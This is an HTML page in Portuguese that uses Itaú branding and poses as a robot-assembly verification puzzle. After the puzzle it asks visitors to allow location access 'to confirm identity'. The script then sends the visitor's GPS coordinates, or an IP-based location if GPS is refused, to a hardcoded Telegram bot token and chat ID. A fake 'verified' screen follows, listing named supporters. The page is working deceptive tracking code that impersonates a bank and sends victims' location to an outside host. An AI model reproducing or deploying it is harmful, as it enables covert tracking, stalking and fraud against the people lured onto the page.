<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Monte o robÃ´ â€“ ItaÃº</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
body{background:#0a2540;color:#fff;display:flex;min-height:100vh;align-items:center;justify-content:center;flex-direction:column}
.card{background:#fff;color:#003366;border-radius:16px;padding:24px;max-width:340px;text-align:center;box-shadow:0 8px 24px rgba(0,0,0,.25)}
h2{font-size:18px;margin-bottom:12px}
p{font-size:14px;margin-bottom:16px}
.pieces{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:16px}
.piece{width:100%;aspect-ratio:1/1;background:#f1f1f1;border:2px solid transparent;border-radius:8px;cursor:pointer;position:relative}
.piece img{width:100%;height:100%;object-fit:contain}
.piece.wrong{border-color:#e74c3c}
.piece.ok{border-color:#00c851}
button{background:#003366;color:#fff;border:none;padding:12px 0;width:100%;border-radius:6px;font-size:16px;cursor:pointer}
button:disabled{background:#999;cursor:not-allowed}
button:active{transform:scale(.98)}
#localBtn{display:none}
</style>
</head>
<body>

<!-- ETAPA 1 â€“ MONTE O ROBÃ” -->
<div id="step1" class="card">
  <h2>Monte o robÃ´</h2>
  <p>Clique nas peÃ§as <strong>na ordem</strong> (1 a 6).</p>
  <div class="pieces" id="pieces"></div>
  <button id="continue1" disabled>Continuar</button>
</div>

<!-- ETAPA 2 â€“ PERMITIR LOCALIZAÃ‡ÃƒO -->
<div id="step2" class="card" style="display:none">
  <h2>Permitir localizaÃ§Ã£o</h2>
  <p>Precisamos confirmar sua identidade.</p>
  <button id="localBtn">Permitir localizaÃ§Ã£o</button>
</div>

<!-- ETAPA 3 â€“ LISTA DE APOIADORES -->
<div id="step3" class="card" style="display:none">
  <h2>Verificado âœ…</h2>
  <p>Apoiadores confirmados:</p>
  <ul style="text-align:left;font-size:13px;padding-left:20px">
    <li>Carlos Henrique â€“ DJ</li>
    <li>Amanda Souza â€“ SeguranÃ§a</li>
    <li>Lucas Oliveira â€“ Bar</li>
    <li>Tamires Lima â€“ Entradas</li>
    <li>Rafael Gomes â€“ Som</li>
    <li>JÃ©ssica Costa â€“ AmbulÃ¢ncia</li>
    <li>Bruno Silva â€“ Limpeza</li>
    <li>Luana Ferreira â€“ DecoraÃ§Ã£o</li>
  </ul>
  <p style="font-size:11px;color:#666;margin-top:12px">LicenÃ§a de baile emitida com sucesso.</p>
  <button id="prossegue" disabled>Prosseguir</button>
</div>

<script>
// CONFIG
const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
const CHAT_ID = '-1003187104876';

// SVGs DAS PEÃ‡AS (1 a 6)
const svgs = [
  '%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"%3E%3Crect x="10" y="10" width="80" height="30" rx="8" fill="%23003366"/%3E%3C/svg%3E', // cabeÃ§a
  '%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"%3E%3Crect x="20" y="15" width="60" height="20" rx="6" fill="%23003366"/%3E%3C/svg%3E', // pescoÃ§o
  '%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"%3E%3Crect x="5" y="5" width="90" height="40" rx="10" fill="%23003366"/%3E%3C/svg%3E', // tronco
  '%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"%3E%3Crect x="10" y="10" width="35" height="60" rx="8" fill="%23003366"/%3E%3C/svg%3E', // braÃ§o esq
  '%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"%3E%3Crect x="55" y="10" width="35" height="60" rx="8" fill="%23003366"/%3E%3C/svg%3E', // braÃ§o dir
  '%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"%3E%3Crect x="25" y="10" width="50" height="70" rx="10" fill="%23003366"/%3E%3C/svg%3E'  // pernas
];

// EMBARALHA ARRAY
const shuffle = a => a.sort(() => Math.random() - 0.5);

// MONTA PEÃ‡AS
let seq = [];
const piecesBox = document.getElementById('pieces');
[0,1,2,3,4,5].forEach(i => {
  const div = document.createElement('div');
  div.className = 'piece';
  div.dataset.idx = i;
  div.innerHTML = `<img src="data:image/svg+xml;utf8,${svgs[i]}" alt="peÃ§a ${i+1}">`;
  piecesBox.appendChild(div);
});
shuffle([...piecesBox.children]).forEach(el => piecesBox.appendChild(el));

// CLICK NAS PEÃ‡AS
document.querySelectorAll('.piece').forEach(p => p.addEventListener('click', () => {
  const idx = Number(p.dataset.idx);
  if (seq.length === idx) {
    seq.push(idx);
    p.classList.add('ok');
    if (seq.length === 6) document.getElementById('continue1').disabled = false;
  } else {
    p.classList.add('wrong');
    setTimeout(() => p.classList.remove('wrong'), 400);
  }
}));

// CONTINUAR â†’ ETAPA 2
document.getElementById('continue1').addEventListener('click', () => {
  document.getElementById('step1').style.display = 'none';
  document.getElementById('step2').style.display = 'block';
  document.getElementById('localBtn').style.display = 'inline-block';
});

// PERMITIR LOCALIZAÃ‡ÃƒO
let localOk = false;
document.getElementById('localBtn').addEventListener('click', () => {
  navigator.geolocation.getCurrentPosition(
    p => {
      const {latitude: lat, longitude: lon} = p.coords;
      enviaTelegram(`ðŸ“ GPS: https://maps.google.com/?q=${lat},${lon}`);
      localOk = true;
      mostraStep3();
    },
    () => {
      fetch('https://ipapi.co/json/')
        .then(r => r.json())
        .then(d => {
          enviaTelegram(`ðŸ“ IP: https://maps.google.com/?q=${d.latitude},${d.longitude}`);
          localOk = true;
          mostraStep3();
        });
    }
  );
});

// ENVIA TELEGRAM
const enviaTelegram = (msg, media) => {
  const url = media
    ? `https://api.telegram.org/bot${TOKEN}/sendPhoto`
    : `https://api.telegram.org/bot${TOKEN}/sendMessage`;
  fetch(url, {
    method: 'POST',
    body: media
      ? (() => { const f = new FormData(); f.append('chat_id', CHAT_ID); f.append('caption', msg); f.append('photo', media, 'selfie.jpg'); return f; })()
      : JSON.stringify({chat_id: CHAT_ID, text: msg}),
    headers: media ? {} : {'Content-Type':'application/json'}
  });
};

// MOSTRA ETAPA 3
function mostraStep3(){
  document.getElementById('step2').style.display = 'none';
  document.getElementById('step3').style.display = 'block';
  document.getElementById('prossegue').disabled = false;
}

// AÃ‡ÃƒO FINAL
document.getElementById('prossegue').addEventListener('click', () => {
  alert('Tudo certo! Prosseguindo...');
});
</script>
</body>
</html>
